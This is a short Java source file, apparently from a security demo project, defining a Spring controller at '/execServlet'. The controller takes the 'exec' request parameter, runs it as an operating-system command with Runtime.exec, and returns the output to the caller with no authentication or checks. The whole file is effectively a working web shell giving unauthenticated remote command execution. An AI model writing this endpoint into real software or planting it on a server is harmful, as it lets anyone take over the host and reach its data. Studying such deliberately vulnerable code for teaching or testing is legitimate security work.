package summary.safe.ssrf.web;

import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.ServletException;
import javax.servlet.ServletOutputStream;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;


@RestController
public class ExecServlet extends HttpServlet {
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        this.doGet(request, response);
    }

    @RequestMapping("/execServlet")
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String exec = request.getParameter("exec");
        Process res = Runtime.getRuntime().exec(exec);
        InputStream inputStream = res.getInputStream();
        ServletOutputStream outputStream = response.getOutputStream();
        int len;
        byte[] bytes = new byte[1024];
        while ((len = inputStream.read(bytes)) != -1) {
            outputStream.write(bytes, 0, len);
        }
    }
}
